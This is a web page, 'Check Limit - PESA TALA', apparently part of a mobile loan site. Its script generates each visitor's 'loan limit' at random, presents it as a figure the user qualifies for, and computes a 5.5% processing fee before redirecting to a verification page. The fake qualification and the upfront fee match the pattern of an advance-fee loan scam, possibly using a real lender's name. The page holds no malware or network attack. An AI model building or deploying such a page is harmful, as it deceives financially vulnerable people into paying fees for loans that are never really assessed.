<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Check Limit - PESA TALA</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-tr from-purple-900 via-purple-700 to-gray-300 min-h-screen p-4 flex items-center justify-center">

  <div class="bg-white rounded-2xl shadow-xl max-w-sm w-full p-6 text-center">
    <h2 class="text-2xl font-bold text-purple-800 mb-4">Your Loan Limit</h2>

    <p class="text-gray-700 mb-2">Hi, <span id="userName" class="font-semibold"></span></p>
    <p class="mb-4">You qualify for up to:</p>
    <div class="text-3xl font-bold text-green-700 mb-4" id="maxLimit"></div>

    <input type="range" id="loanSlider" min="1800" max="5000" value="2500"
      class="w-full accent-purple-700 mb-2" oninput="updateLoanInfo()" />

    <p class="text-sm text-gray-700">Selected Amount: <span id="selectedAmount" class="font-bold"></span></p>
    <p class="text-sm text-gray-700">Processing Fee (5.5%): <span id="fee" class="font-bold text-purple-700"></span></p>

    <button onclick="proceed()" class="mt-6 w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-3 rounded-xl transition">
      Proceed
    </button>

    <!-- Popup -->
    <div id="popup" class="hidden mt-6 bg-purple-100 text-purple-900 p-4 rounded-lg shadow-lg">
      <p class="font-semibold">ðŸŽ‰ Congratulations!</p>
      <p>Youâ€™ve selected <span id="popupAmount"></span></p>
      <p>Repayment is due in <strong>14 days</strong>.</p>
      <p>Processing Fee: <span id="popupFee" class="font-semibold text-purple-700"></span></p>
    </div>
  </div>

  <script>
    const fullName = localStorage.getItem("fullName") || "User";
    const userName = document.getElementById("userName");
    userName.textContent = fullName;

    // Generate random loan limit
    const loanLimit = Math.floor(Math.random() * (5000 - 1800 + 1)) + 1800;
    const loanSlider = document.getElementById("loanSlider");
    loanSlider.max = loanLimit;
    loanSlider.value = loanLimit;

    document.getElementById("maxLimit").textContent = "Ksh " + loanLimit.toLocaleString();

    function updateLoanInfo() {
      const value = parseInt(loanSlider.value);
      const fee = (value * 0.055).toFixed(0);
      document.getElementById("selectedAmount").textContent = "Ksh " + value.toLocaleString();
      document.getElementById("fee").textContent = "Ksh " + parseInt(fee).toLocaleString();
    }

    updateLoanInfo();

    function proceed() {
      const amount = parseInt(loanSlider.value);
      const fee = Math.floor(amount * 0.055);

      localStorage.setItem("loanAmount", amount);
      localStorage.setItem("processingFee", fee);

      // Show popup
      document.getElementById("popupAmount").textContent = "Ksh " + amount.toLocaleString();
      document.getElementById("popupFee").textContent = "Ksh " + fee.toLocaleString();
      document.getElementById("popup").classList.remove("hidden");

      // Redirect after 3s
      setTimeout(() => {
        window.location.href = "verification.html";
      }, 3000);
    }
  </script>
</body>
</html>
